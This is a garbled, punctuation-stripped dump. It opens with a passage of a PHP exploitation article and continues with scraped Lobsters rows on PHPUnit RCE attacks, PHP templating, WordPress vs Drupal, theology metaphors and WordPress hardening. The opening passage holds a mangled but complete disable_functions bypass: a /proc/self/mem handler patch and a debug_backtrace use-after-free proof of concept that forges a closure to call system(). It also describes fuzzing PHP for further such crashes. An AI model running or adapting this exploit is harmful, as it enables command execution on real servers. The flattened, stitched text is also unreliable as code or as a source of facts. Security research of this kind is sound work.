parsed phnum header base parsed phoff parsed phentsize parsed ptype getdata fd header parsed pflags getdata fd header parsed pvaddr getdata fd header parsed pmemsz getdata fd header parsed ptype parsed pflags parsed dataaddr parsed type parsed pvaddr base parsed pvaddr parsed datasize parsed pmemsz else parsed ptype parsed pflags parsed textsize parsed pmemsz return parsed previous section saw array composed zendfunctionentry structure first two member pointer function name handler therefore want locate pointer zifucfirst zifsystem sequentially extract block use value address read byte case valid memory address byte correspond function name mean position memory address found corresponds fname field zendfunctionentry structure therefore field containing target handler byte laterlooking handlersthis procedure would used locate entry function escapeshellcmd zifsystem distance function gethandlers base dataaddr textsize datasize print searching handler basicfunctions n handler array fd fopen procselfmem rb datasize test getdata fd dataaddr test base test base dataaddr base fname getdata fd test fname ucfirst python c ucfirst print encode hex handler ucfirst getdata fd dataaddr print zifucfirst found dechex handler ucfirst n continue else fname escapeshellcmd python c escapesh print encode hex handler system getdata fd dataaddr print zifsystem found dechex handler system n return handler point know location zifucfirst remains scan heap address found functiontable replace zifsystem function scanandpatch base final old new print scanning heap locate functiontablen fd fopen procselfmem rb final base test getdata fd base test old print zifucfirst referenced dechex base n fseek fd base print patching ucfirst zifsystem handlern fwrite fd new return modifying functiontable way calling ucfirst system actually disablefunctionssystem disablefunctionspocphp bypassing disablefunctions openbasedir misconfigured poc parsing mapped memory region binary heap searching handler basicfunctions zifucfirst found zifsystem found scanning heap locate functiontable zifucfirst referenced patching ucfirst zifsystem handler calling ucfirst uname linux insulaservus smp debian gnulinuxif concept explained far clear start battling real vulnerability create exploitsa flyweight combat debugbacktrace exploit uaf vulnerability peculiarity exploitation greatly differ one another likewise difficulty problem solved different case nevertheless section going analyze exploit quite simple vulnerability allow u put practice different concept seen previous section analyze rebuild useafterfree exploit debugbacktrace note section use php compiled symbol without optimization php cli built mar nt configure cflags g make j nproc sudo make installthe script exploit vulnerability reported year ago small example bugtracker thread trigger problem php class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg triggeruaf x identify existence useafterfree uaf using valgrind run export prior invalid write size zvaladdrefp debugbacktracegetargs zendfetchdebugbacktrace zenddefaultexceptionnewex zenddefaultexceptionnew objectandpropertiesinit objectinitex zendnewspecconsthandler executeex zendcallfunction zendcallmethod zendobjectsdestroyobject zendobjectsstoredel address byte inside block size free free efree zendstringfree zvaldtorfunc izvalptrdtor zvalptrdtor zendstdunsetproperty zendunsetobjspecunusedconsthandler executeex zendcallfunction zendcallmethod zendobjectsdestroyobject zendobjectsstoredel zvaldtorfunc block alloc malloc zendmalloc emalloc zendstringalloc zendstringinit zifstrshuffle zenddoicallspecretvalusedhandler executeex zendexecute zendexecutescripts phpexecutescript docli main confirming exploitability vulnerability trivial php function pwn global canary backtrace class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args dummy strshuffle strrepeat b print canary print bbb bbbb pwn showed printing variable canary actually got content dummy previous example instead using string fill gap left use object able see representation memory php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper function x print canary pwn however see regular string usrlocalbinphp uafphp aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaif instead using print use debugzvaldump see refcount field hold wrong value usrlocalbinphp uafphp string aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa refcount php string represented using structure zendstring structure store string group char instead pointer struct zendstring zendrefcountedh gc zendulong h sizet len char val char turn variable zend engine called zval value contained following structure typedef union zendvalue zendlong lval double dval zendrefcounted counted zendstring str zendarray arr zendobject obj zendresource re zendreference ref zendastref ast zval zv void ptr zendclassentry ce zendfunction func struct ww zendvalue knowing information fixing object size number property get leaked memory string php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x address canary canary canary canary canary canary canary canary print strrev address vardump pwn execute usrlocalbinphp uafphp check value corresponds memory address stdobjecthandlers pwndbg xx stdobjecthandlers arbitrary relative reading writing interpreting canary string access byte array canary x need achieve absolute arbitrary reading able read content valid memory address use one helper object property let put breakpoint vardump proceed following example php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x helper kkkk vardump helper pwn inspecting memory get following pwndbg xg args pwndbg pointer zendstring see pointer zendstring structure containing kkkk string pwndbg kkkk inspecting structure pwndbg print zendstring gc refcount u v type flag gcinfo typeinfo h len val k relative writing change zendstring structure pointer point different valid memory address able leak content let try changing pointer one taken debugger testing php function pwn global canary backtrace helper class vuln public public function destruct global backtrace unset backtrace new exception gettrace function triggeruaf arg arg strshuffle strrepeat vuln new vuln vuln arg class helper public b c function str p address j j j address address ord str p j return address function write str p v n n str p chr v v contiguous nalloc contiguous strshuffle strrepeat triggeruaf x canary backtrace args helper new helper helper b function x phpheap canary canaryaddr phpheap write canary write canary write canary hexdec random valid address use test write canary vardump helper pwn indeed point address indicated pwndbg pointer used test interpreted zendstring memory area leak information example make strlen helper pwndbg pwndbg print zendstring gc refcount u v type u flag u gcinfo typeinfo h len val ability leak arbitrary content possible repeat procedure followed previous section order identify zifsystem handler instead patching internal function handler functiontable choose reuse anonymous function created helper b anonymous function closure following structure typedef struct zendclosure zendobject std zendfunction func zval thisptr zendclassentry calledscope zifhandler originternalhandler zendclosure within func field zendfunction find zendinternalfunction structure typedef struct zendinternalfunction common element zenduchar type zenduchar argflags bitset arginfopassbyreference fnflags zendstring functionname zendclassentry scope zendfunction prototype numargs requirednumargs zendinternalarginfo arginfo end common element zifhandler handler struct zendmoduleentry module void reserved zendmaxreservedresources zendinternalfunction look like following gdb type argflags fnflags functionname scope prototype numargs requirednumargs arginfo handler module reserved overwriting field handler one zifsystem modifying field type mark internal function userdefined one system function would called complete exploit look like php php disablefunctions bypass poc nix bug http bugsphpnetbugphp debugbacktrace return reference variable destroyed causing uaf vulnerability exploit work php version released author http pwn uname function pwn cmd global abc helper backtrace class vuln public public function destruct global backtrace unset backtrace new exception gettrace isset backtrace args php backtrace debugbacktrace class helper public b c function str p address j j j address address ord str p j return address function ptr chr ptr ptr return function write str p v n n str p chr v v function leak addr p global abc helper write abc addr p leak strlen helper leak return leak function parseelf base etype leak base ephoff leak base ephentsize leak base ephnum leak base ephnum header base ephoff ephentsize ptype leak header pflags leak header pvaddr leak header pmemsz leak header ptype pflags ptload pfreadwrite handle pie dataaddr etype pvaddr base pvaddr datasize pmemsz else ptype pflags ptload pfreadexec textsize pmemsz dataaddr textsize datasize return false return dataaddr textsize datasize function getbasicfuncs base elf list dataaddr textsize datasize elf datasize leak leak dataaddr leak base leak base dataaddr base deref leak leak constant constant check deref continue else continue leak leak dataaddr leak base leak base dataaddr base deref leak leak constant check deref continue else continue return dataaddr function getbinarybase binaryleak base start binaryleak addr start leak leak addr leak elf header return addr function getsystem basicfuncs addr basicfuncs fentry leak addr fname leak fentry fname system return leak addr addr fentry return false function triggeruaf arg strshuffle prevents opcache string interning arg strshuffle strrepeat vuln new vuln vuln arg stristr phpos win die poc nix system nalloc increase value uaf fails contiguous nalloc contiguous strshuffle strrepeat triggeruaf x abc backtrace args helper new helper helper b function x strlen abc strlen abc die uaf failed leak closurehandlers abc phpheap abc abcaddr phpheap fake value write abc write abc fake reference write abc abcaddr write abc closureobj abc binaryleak leak closurehandlers base getbinarybase binaryleak die could nt determine binary base address elf parseelf base die could nt parse elf header basicfuncs getbasicfuncs base elf die could nt get basicfunctions address zifsystem getsystem basicfuncs die could nt get zifsystem address fake closure object fakeobjoffset write abc fakeobjoffset leak closureobj pwn write abc abcaddr fakeobjoffset write abc internal func type write abc zifsystem internal func handler helper b cmd exit scouting new rival finding lowhanging fruit grammaraware fuzzingthe previous section focused php internals explaining exploit vulnerability subvert effect disablefunctions directive section address issue related fuzzing vulnerability searching zend enginebefore diving subject worth mentioning lot crash reported bug php bug tracker may exploitable go unnoticed case example vulnerability exploited previous section problem known year situation occur various reason whoever open ticket bug tracker provide enough information andor code attached long short making difficult identify root cause even verify reproducibility crashthe issue considered minor bug considered security problem fix postponed criterion php classifies bug bug arbitrary usercontrolled code used considered security issue practice time translates local vulnerability must reported regular bugsthe root cause bug difficult fix proposed patch fix problem completelyso interesting check bug tracker vulnerability hidden plain sight hand checking engine component prone problem allows u focus effort besides fuzzing common rediscover crash people previously identified reportedthere multiple approach search php vulnerability fuzzing term focus technique use regarding focus unlikely find vulnerability language parser worth spending time historically design php deserialization unserialize quite problematic security flaw always appear addition exploitation prone lead rce although currently use unserialize discouraged various cm platform make use function serialized data user control cooky several article covering basic fuzzing function exploitation goal identifying vulnerability may allow circumventing disablefunctions code flow allows u obtain arbitrary read write memory primitive sufficient context contrasting past experience preferable follow approach focused finding superficial shallow crash rather focus specific component stream packunpack domxml etc word maximize result making minimum effort end follow fuzzing strategy generating grammatically valid portion php code ie executed return syntax error without taking account feedback generating new test case strategy follow performing simple mutation ast level using project like phpast even going extending afl capability perform mutation superion project case domato used generating test case modified phporiented version recently published name domatophp interesting thing modified version includes dictionary rule function definition allowing u save lot time however possible considerably improve amount unique crash identified making improvement example function parameter definition extracted parsing phpnet documentation source information sometimes completely accurate eg string parameter actually path existence hidden undocumented parameter etc complement function definition brought domatophp two strategy followed one hand real parameter extracted directly source code parsing macro hand error message analyzed done using simple gdb script extracting parameterson hand domato allows assigning probability rule applies code generation interesting certain fuzzed parameter example case function use file directory path interesting always use random text string usually function first validate path characteristic file directory readwrite permission playing different parameter path file readonly permission another one write permission directory etc possible reach different state pathfuzz stringfuzz pathfuzz pathrwfuzz pathfuzz pathrofuzz pathfuzz pathdirfuzz improvement use strshuffle deal cache optimization regular call vardump increased number parameter vary etc run test case small c code created make use posixspawn parallel start process vfork provides acceptable speed run per secondthe test case generated crash simplified synthesized small python script start php script hundred line look like try try simplexmlloadfile strrepeat chr strrepeat chr strrepeat chr strrepeat chr strrepeat chr implode arraymap function c return x strpad dechex c range true catch exception e catch error e try try var splobjectstorage offsetget var arrayrand var catch exception e catch error e try try var reflectionproperty getname catch exception e catch error e try try var spldoublylinkedlist shift catch exception e catch error e try try var splfixedarray setsize catch exception e catch error e try try var splfixedarray count catch exception e catch error e try try mbhttpinput strrepeat catch exception e catch error e try try var reflectionproperty setvalue catch exception e catch error e try try strsplit implode arraymap function c return x strpad dechex c range catch exception e catch error e try try ctypeupper strrepeat chr strrepeat chr catch exception e catch error e try try var splfixedarray rewind catch exception e catch error e try try var reflectionproperty isdefault catch exception e catch error e try try var domdocument createcomment strrepeat catch exception e catch error e try try striptags strrepeat chr strrepeat chr strrepeat chr catch exception e catch error e try try strrpos strrepeat catch exception e catch error e try try var reflectionproperty isprotected catch exception e catch error e try try ctypealnum etcpasswd catch exception e catch error e try try var domelement setattributenodens new domattr attr catch exception e catch error e try try streamwrapperunregister strrepeat chr catch exception e catch error e try try var reflectionclass hasmethod strrepeat chr catch exception e catch error e end one much easier understand debug later php aaa new simplexmlelement aaaa xpath strrepeat chr real crash found first minutesthis size reduction test case together simplification allows first classification term affected component well comparing crash among rule duplicate execution trace also used call stack instruction caused segfault asan output etc considering part general operation scheme following operation schemefinally need analyze crash check one caused real vulnerability instead simple bugplaying league alternative way bypass disablefunctionsin addition vulnerability allow arbitrary memory manipulation case possible execute system command despite restriction imposed disablefunctions seen previous section directive work changing handler disabled function possible classic vulnerability command injection identified among enabled function allowing exploited order achieve arbitrary command execution example happened recently function imapopen another case take place whenever function putenv enabled conjunction function initiate external process eg mail default executes sendmail binary technique used tool chankro execute arbitrary binary using ldpreload case find common pattern php end invoking syscalls execve start new process using domatophp grammar rule conjunction improvement gdb script possible create test case function registered zend engine check execve another interesting syscall calledwhile read p cat templatephp alchitopophp echo p alchitopophp echo p logtxt strace f php r eval filegetcontents php stdin alchitopophp grep exe grep sh logtxt rm alchitopophp done funcstxtin case minimal compilation extension mail appears candidate checking syscallsit interesting check function new php version well install extension different distros use default order detect new way exploitation conclussionsin article discussed depth disablefunctions work well exemplified exploitation php vulnerability bypass likewise methodology identifying new vulnerability explained fuzzing process search alternative mail putenv must continuously executed time refreshing target new version php also interesting use different build option special emphasis extension based common distribution reference source code basicfunctions source code procfs bypass beched escapeshellcmd basicfunctions php debugbacktrace uaf exploit bug useafterfree accessing already destructed backtrace argument debugging memory php internals book string management zendstring php internals book c struct hack basic structure php internals book zendclosure source code stdobjecthandlers source code zendinternalfunction source code php bug tracker php clasification security issue fuzzing unserialize function fuzzing php fun profit exploiting unserialize fuzzing grammar fuzzing book phpast github superion grammaraware greybox fuzzing domato dom fuzzer domatophp hunting hidden parameter within php builtin function using frida stupid php gdb helper faster fuzzing python imapopen command injection chankro tool bypass disablefunctions openbasedir bypass disablefunctions openbasedir
46,Lobsters,php,PHP programming,The Resurrection of PHPUnit RCE Vulnerability,https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/,resurrection phpunit rce vulnerability,scope study security announcement figure phpunit campaign statistic deep dive detail evalstdinphp php input php stdin sapi server api php input php stdin function filegetcontents eval php input evalstdinphp additional fix evalstdinphp phpsapi evalstdinphp figure flow diagram new phpunit attack tweet used anymore actually case conclusion vulnerable observed case infected,software patch released tend believe mean problem solved time however actually case fully solving problem requires developer grab latest patch version deploy environment since upgrading especially trivial action developer need plan ahead insert change via development process scheduling proper time deploy case describe see sometimes even enough part study carried imperva observed around nine million attack attempt exploit vulnerability one exploitable cf came wonder old vulnerability resurrected become popular among attacker attack attempt year around seven million last six month around two million january saw around percent attack conducted last two month january scope understand hype around particular cve need understand vulnerability look exploited fixed article go aspect june remote code execution vulnerability disclosed phpunit widelyused testing framework php used perform unit test application development cycle unfortunately many development process optimal framework stay enabled production make attacker life sweet easy since used variety popular cm content management system wordpress drupal prestashop well many module developed third party scope security breach quite wide example several known module deploy production including phpunit framework prestashop autoupgrade pscartabandonmentpro psfacetedsearch gamification pscheckout wordpress jekyll exporter plugin dzsvideogallery cloudflare mediawiki moodle drupal mailchimpmailchimp commerce drupal published public service announcement make clear even patch phpunit perse still vulnerable using framework relies old version study first step study search cve medium saw thread published tech community forum middecember user complaining suspicious file possibly injected phpunit folder addition january prestashop ecommerce solution written php published security announcement regarding phpunit vulnerability exploited malware named xsamxadoo bot could used gain access php server take control seen malware activity since january went back data analyze phpunit attack targeting user found prestashop release covered tip iceberg one campaign trying exploit vulnerability figure see least ten campaign last three month although xsamxadoo one definitely largest reviewing campaign important clearly define campaign attack attempt us payload used multiple ip target multiple site figure phpunit campaign statistic campaign name number request number attacking ip number site max attack per day ssspphp traber rcevuln killphp probing xsamxadoobot campaign detail see top two campaign ssspphp traber maximum number eight million four million attack per day respectively figure see campaign attack divided percentage let see campaign timeline last three month timeline learn many campaign active long time furthermore see two peak two leading campaign ssspphp traber two specific date november january even though vulnerability two year old hacker still trying luck exploiting prestashop identified one campaign definitely waiting vulnerable server fall net deep dive detail understand root issue leading vulnerability let first look fix phpunit evalstdinphp file november explain php input v php stdin mean first need know sapi mechanism control interaction outside world php engine sapi stand server api php input intended use webbased remote sapis php stdin intended use cli local sapis function filegetcontents read entire file string eval executes string php input readonly stream allows read raw data request body original php code get file via input stream convert string executes allows attacker run arbitrary code via http request evalstdinphp change remove ability pas file input sent webbased context file expects input stdin local december additional fix added evalstdinphp without cve pointing security patch explain change need understand phpsapi mean php run web server module cgi common gateway interface application command line cli script adding condition evalstdinphp file developer aiming eliminate option execute php file context cli phpdbg recall previous change developer changed usage php input php stdin adding restriction cli phpdbg narrowing access running arbitrary php server thing one assumption possibility exploiting code somehow passing arbitrary code via stdin attacker might use cgi bypass stdin limitation since cgi run locally server pas parameter via stdin leaving application vulnerable even applying fix mentioned flow diagram assume new attack could look like figure flow diagram new phpunit attack january saw several tweet related phpunit vulnerability saying additional vulnerability phpunit version discovered yet published phpunit maintainer confirmed vulnerability cve request submitted suspiciously however date evalstdinphp deleted phpunit repository comment used anymore actually case actually suspect removed potential risk mentioned via local access evalstdinphp let wrap event mentioned together within timeline short timeline chain event conclusion old vulnerability gone world moment patch published requires developer using vulnerable framework perform update although ignore recommendation either mistake purpose never apply patch patching considered annoying endless step development cycle since new patch continuously published therefore many framework thirdparty module using latest available code hacker know still try luck old vulnerability often great success addition old phpunit vulnerability used good indication pointing new vulnerability phpunit yet published possible phpunit version containing evalstdinphp affected aware might unknowingly using vulnerable module developed third party using phpunit framework without removing publishing production vulnerable check phpunit exists production webserver phpunit version possible vulnerable specific server configuration recommended remove although observed case removal phpunit cause unexpected behavior webserver also possible block remote access vendor directory root path phputil framework infected check new file phpunit path check core file changed lately safe secure imperva
47,Lobsters,php,PHP programming,Back to Basics: PHP Templates (Part I),https://www.tuxed.net/fkooman/blog/back_to_basics_php_templates_part_one.html,back basic php template part,back basic php template part twig blade smarty plate ssi alternative syntax control structure shortcut syntax escaping output buffering variable extraction update lobster history,back basic php template part published series blog post take along process creating fully featured minimalist php template engine scratch would anyone ever want many available template engine like twig blade smarty plate good question reason came wanting really understand modern template engine work avoiding big complicated template framework dependency application first part post compare various template engine concept come first version template engine work many simple case part ii cover template inheritance part iii talk internationalization support concept template theme restrict php talk eg ssi also powerful enough use case look first purpose article define template mean separate application logic presentation word want avoid mixing application code way presented user browser broadly speaking two different approach building php template use language specifically designed template eg twig blade smarty use native php template plate first approach template engine like smarty twig blade using example show simple twig template html head title pagetitle title head body ul myfavoriteanimal myfavoriteanimals li myfavoriteanimal li endfor ul body html see twig project designed template syntax native php foreach loop replaced php echo replaced possible reason creating new template syntax may easier understand template designer case understand php another becomes easier automatically escape template variable mitigate cross site scripting x drawback custom template syntax relatively slow page display template need parsed first slower directly outputting html running embedded php code reason template engine template syntax caching mechanism convert template actual php first course caching mechanism introduces convert twig example php look like html head title pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li myfavoriteanimal li php endforeach ul body html see look quite similar twig example accomplished using two neat php feature alternative syntax control structure allow avoid using opening closing bracket making syntax easier read next shortcut syntax echo allows replace php echo v v simplifying template looking minimal template engine justify creating template syntax leverage php much possible however make use native php template easier neat trick explore concept php help u noted solution presented build heavily way plate work escaping consider following php code php userid get userid p hello userid p problem variable get userid escaped ie one could inject data specifying query parameter userid javascript code x vulnerability fix straightforward bit unwieldy native php template engine use something like php userid get userid p hello htmlspecialchars get userid entquotes p safe display value userid query parameter page course building template engine great need specify whole htmlspecialchars command every time want output variable figure something output buffering php use obstart obgetclean variant allows capture whatever script sends output variable php obstart name world include pagetplphp renderedtemplate obgetclean example file pagetplphp contains p hello name p variable renderedtemplate contain p hello world p html output evaluated php concept powerful fundamental part minimalist template engine variable extraction template engine allow specify template variable array eg php template render templatename userid foo usergroups admin employee template engine use extract convert key array actual php variable calling extract userid foo actually create variable userid current scope allows use userid template instead templatevariables userid concept explained create first version templatephp class php class template public function render templatename array templatevariables extract templatevariables obstart include templatename tplphp return obgetclean accompanying pagetplphp contains following html head title pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li myfavoriteanimal li php endforeach ul body html call template class like eg indexphp php new template echo render page pagetitle favorite animal myfavoriteanimals dog cat donkey work see variable yet escaped would introduce potential x vulnerability order fix add method e template class template class thus becomes php class template public function render templatename array templatevariables extract templatevariables obstart include templatename tplphp return obgetclean private function e v return htmlspecialchars v entquotes saw include used output buffering example allows use existing variable template neat trick template also use adding method e template class use e v template making output safe display browser make example complete update pagetplphp like html head title e pagetitle title head body ul php foreach myfavoriteanimals myfavoriteanimal li e myfavoriteanimal li php endforeach ul body html wrap basic presented fully working minimalist template engine stay tuned next part talk template inheritance internationalization theme update see discussion lobster history
48,Lobsters,php,PHP programming,WordPress vs Drupal is like Word vs Excel,https://www.freelock.com/blog/john-locke/2020-02/wordpress-vs-drupal-word-vs-excel,wordpress v drupal like word v excel,wait minute wordpress cm database everybody say use wordpress wrong ok lied drupal nt like excel like access give u call,seems like every day month answered question use drupal instead wordpress answer come entirely different application different microsoft word microsoft excel wordpress first foremost blogging tool become widely adopted designer trying make prettylooking site shortage beautiful wordpress site need relatively simple marketing site rich content great tool drupal hand like general purpose database tool skinned look great strength much like excel great managing lot item characteristic built work extremely well purpose managing scad information making flyer yard sale would nt necessarily pick excel word quick easy make something like pull sort design paste make something look pretty good make table show difference couple product hundred product start run problem create bunch comparison word full blown macro system built certainly excel using word nt mean good idea wait minute wordpress cm database yes wordpress call content management system basic architecture necessary publishing workflow api creating different post type adding custom field stuff drupal user interface creating field wordpress core either need get one many different usually proprietary addon plugins developer write code set post type contrast creating new content type adding field adding relationship content type drupal core fundamental starting point building new drupal site wordpress first decision typically pick theme lot theme come bunch extra functionality help actually build site drupal first decision organize content theme tacked towards end process easily changed point everybody say use wordpress wrong wrong use word matter choosing right tool job creating brochure way easier word excel trying keep track registered event word excel add filter calculated column keep track registration paid need collect payment door might well able find plugin help word suddenly really word using registration obscure plugin whereas tabulating data essence excel exactly difference wordpress drupal get beyond core layout blogging basic site functionality come word suddenly plugin land core functionality longer shared ten million wordpress user user specific plugin need different plugin different functionality need cross finger nt blow site weird conflict drupal built kind integration different kind thing need show event date add calendar need show location add map set geolocation need charge add commerce want user rate add voting module everything work together drupal build upon everything else instead oneoff island functionality may may work thing need ok lied drupal nt like excel like access lot people familiar excel access useful many different situation access general purpose database compared excel bit harder prototype thing way powerful early access competitor like filemaker pro popular tool build entire business operation system many small business nonprofit exactly kind thing drupal extremely well even organized way really hard take access database port everything drupal bring entire application web make available mobile device tablet remote worker etc business analysis skill even apply huge number scenario work administrator really need bring developer make look good add automation drupal cm general purpose database system use revolutionize entire business operation website particularly useful want remove barrier interact customer organize internal business process automate painstaking operational task would like learn make business run better using drupal similar technology give u call happy explore idea
49,Lobsters,php,PHP programming,Programming metaphors for theological concepts,https://shaungallagher.pressbin.com/blog/metaphors.html,programming metaphor theological concept,eternal security holy communion trinity diagram form impermanence parmenides flatland free moroni promise moroni promise true scotsman divine attribute,someone interesting programming religion often found helpful construct metaphor code illustrate religious concept like present one come big fat disclaimer none metaphor perfect far illustrate certain approach talking theological matter language comfortable software engineer please consider like conversation starter serious argument eternal security phrase saved always saved succinct summation doctrine eternal security also known perseverance saint asserts person becomes christian assurance eternal salvation assurance permanent way lose doctrine held christian notably reformed tradition influenced calvinism including many evangelicals rejected others catholic orthodox believe possible christian reject salvation eg mortal sin apostasy one programming metaphor use represent constant eternal security javascript hasbecomechristian true const issaved true issaved sendtogoodplace else sendtobadplace issaved constant set value changed fact could refactor code take issaved constant hasbecomechristian always going synonymous issaved refactored eternal security hasbecomechristian true sendtogoodplace else sendtobadplace contrast catholicism reject doctrine eternal security code look like catholic view salvation javascript let issaved false isalive true hasbeenbaptised true issaved true hascommittedmortalsin true hasreconciled false issaved false issaved sendtogoodplace else sendtobadplace example issaved constant variable whose value change time catholicism basically hold given gift salvation baptism possible reject gift mortal sin separate u god however also ability become reconciled god typically sacrament reconciliation restores relationship god gift salvation holy communion many christian denomination incorporate reception holy communion service disagreement though jesus meant last supper instituted practice denomination catholicism orthodoxy believe bread wine consecrated cease bread wine become body blood jesus catholic call transubstantiation orthodox use terminology mean essentially thing transubstantiation python class bread def init self selfisdivine false class body def init self selfisdivine true substance bread assert substanceisdivine false consecrated substance body assert isinstance substance bread false assert isinstance substance body true assert substanceisdivine true protestant denomination lutheranism hold jesus really present holy communion cease bread wine instead jesus body blood present form bread wine lutheranism doctrine real presence python class bread pas class body pas class holycommunion body bread pas hc holycommunion assert isinstance hc bread true assert isinstance hc body true denomination including many baptist treat holy communion mere symbol jesus body blood view called memorialism trinity christian concept holy trinity tricky one represent metaphor shamrock metaphor popularly attributed st patrick commits ancient heresy partialism water metaphor three common state water solid liquid gas represent three person trinity commits ancient heresy modalism pretty much every common analogy problematic aspect one programming metaphor like although nt capture full mystery trinity far tell commit famous heresy best viewed diagram form code holy trinity javascript const father const son const spirit const god consoleassert father god consoleassert son god consoleassert spirit god consoleassert father son consoleassert son spirit consoleassert father spirit impermanence several eastern religion buddhism hinduism core doctrine assert thing impermanent fact according doctrine nothing eternal everything changing time nothing ever stay antithesis view held greek philosopher parmenides asserted nothing change like ever might sound absurd clearly see thing around u changing time thing appear change temporal being perceive one slice temporal reality time twodimensional being flatland see threedimensional being shapechangers view crosssection perhaps existence one eternal unchanging thing mere mortal perceive changing ca nt take let set code illustrates view differ permanance v impermanence php population array array array array array array impermanence count population echo population population changedn unchangedn permanence echo population population changedn unchangedn iterating slice time clear one slice necessarily equal another slice fact depending precision physical temporal scale using might even able say one slice necessarily equal another slice looking existence holistically clear parent array change never redefined mutated free argument permanence convenient leadin topic free concept foundational many religion determinism true action result free choice merely necessary inevitable result everything come beforehand omniscient god already know choice make would seem lack ability choose otherwise put free question stake well free exist really held responsible bad choice make know question free one confronted numerous world religion familiar treatment christianity focus many christian denomination admit form divine predestination biblical evidence view well evidence reason byproduct god omniscience bible predestination often symbolized book life god inscribed name enter heaven broadly significant divide christian believe divine predestination render free utterly impossible believe free god foreknowledge choice compatible calvinist theology get doctrine none u ability anything good whatsoever except god grace also god grace irresistible mean god withholds grace lack freedom choose good god supply grace lack freedom choose evil seems like pretty robust denial free calvin worth made distinction necessity coersion god witholds grace sin necessity meaning mean otherwise nt mean calvin argues god force u sin still make choice depraved nature always make wrong choice alternative view asserts choice indeed free choose respond god grace enables u good reject grace evil instead divine predestination view merely god foreknowledge choice freely make granted nt completely resolve paradox whether action said free god already know choose interesting argument attempt resolve paradox instance one associated st thomas aquinas sidestep issue acknowledging choose action action god know choose god omniscient know option would choose could choose absolute freedom omnipotence ability motivate u choose option little complex argument express programming metaphor though instead going try illustrate calvinist view opposing view broad stroke free go func getchoice option string preference string string len option return option else choose either option based one preference return makechoice option preference func evaluatecalvinist hasgrace bool string hasgrace return good else return bad func evaluatecompatibilist hasgrace bool string var option string option make string option bad hasgrace option good var preference string preference make string preference increase pleasure preference increase holiness var choice getchoice option preference return choice func main var hasgrace bool false var choice evaluatecalvinist hasgrace fmtprintln choice always return bad hasgrace true choice evaluatecalvinist hasgrace fmtprintln choice always return good hasgrace false choice evaluatecompatibilist hasgrace fmtprintln choice always return bad hasgrace true choice evaluatecompatibilist hasgrace fmtprintln choice return bad good based person preference moroni promise book mormon member church jesus christ latterday saint consider sacred text said founder joseph smith english translation ancient writing engraved gold plate fifth century buried presentday new york revealed smith angel early century like bible book mormon consists several subbooks last purportedly written prophet moroni passage known moroni promise prophet say anyone read text prays god reveal whether true god make truth known one thing always interested whether perceiving yes true answer prayer sufficient trust veracity book mormon simple moroni promise rust let answer prayforanswer answer true println book mormon true else println book mormon true nt think simple really matter whether one sincere person hears yes whether every sincere person hears yes improved moroni promise rust let mut alltrue true let allanswers getallanswers answer allanswersiter answer false alltrue false alltrue true println book mormon true else println book mormon true single invalidate moroni promise mean god given two mutually exclusive answer two different people assuming god ca nt lie conclude personal interpretation answer prayer however sincere might effective way discern truth book mormon lds adherent might answer anyone receives must fulfilled condition promise perhaps nt study text enough focus nt pray enough sincerity nt wait long enough receive yes answer misinterpreted answer perceived strike true scotsman approach counterexample since lds guess true scotsman either divine attribute several attribute traditionally associated god classical western theism among omniscience omnipotence omnipresence sometimes divine attribute pitted even case wellknown puzzler omnipotent god create immovable object version paradox make challenge explicit god create object big move standard answer paradox omnipotence traditionally ascribed god mean anything logically possible mean create object square shape object circle shape object whose shape simultaneously square circular logical impossibility actually prefer different answer paradox one offer smartalecky answer smartalecky question yes omnipotent god create immovable physical object object size tennis ball constraint physical object exist simultaneously universe mean entirety physical existence must consist tennis ball nothing else argue object would immovable move thing always move relative something else something else object immovable immovable object detection sql select id exists select existentobjects id eoid moveable existentobjects eo database one row yield id moveable database one row yield id moveable
50,Lobsters,php,PHP programming,How to secure your WordPress site in 2020: The definitive guide,https://markosaric.com/secure-wordpress/,secure wordpress site definitive guide,secure wordpress site wordpress security checklist use unique username strong password turn require verification install theme plugins untrusted source updated automatically backup automatically containerbased isolation wordpress vulnerable insecure serious blogging platform default username andor weak password outdated wordpress software obsolete version php outdated theme plugins crosscontaminate blog hosted server best wordpress security plugins identify existing vulnerability malware malicious code script date software known security issue sucuri sitecheck search console wordfence security host blog secure hosting company best protection crosscontamination use secure wordpress host learn greengeeks happy paying customer greengeeks service automatically updated soon new release nightly backup data containerbased isolation spam protection realtime malware virus monitoring free ssl certificate let encrypt customer support via live chat email phone turn verification completely prevents brute force attack secure sign enable twostep wordpresscom install activate jetpack plugin turn single sign option require twostep authentication disable default wordpress login form block unwanted brute force login attempt jetpack protect automatically block unwanted try bad ip address rest network automate update wordpress plugins vast majority security compromise happen outdated plugins blog design limit number plugins theme installed download theme plugins unknown source plugins theme high number downloads active wordpress user regular update recent last update create new user account limit unauthorized access role capability user add new give role administrator log default admin account log new user detail delete default admin username transfer old post new username use strong secure password least twelve character number special character upper lowercase free tool set new nickname user profile nickname field display name publicly allow guest user registration make sure anyone register option unticked allow ping used ddos attack default article setting tick allow link notification pingbacks trackbacks take regular automatic backup greengeeks database file recommended perform regular full backup entire site updraftplus improve wordpress security,guide feature simple security measure implement secure wordpress site prevent hacking attack keep content safe include best wordpress security solution precaution post 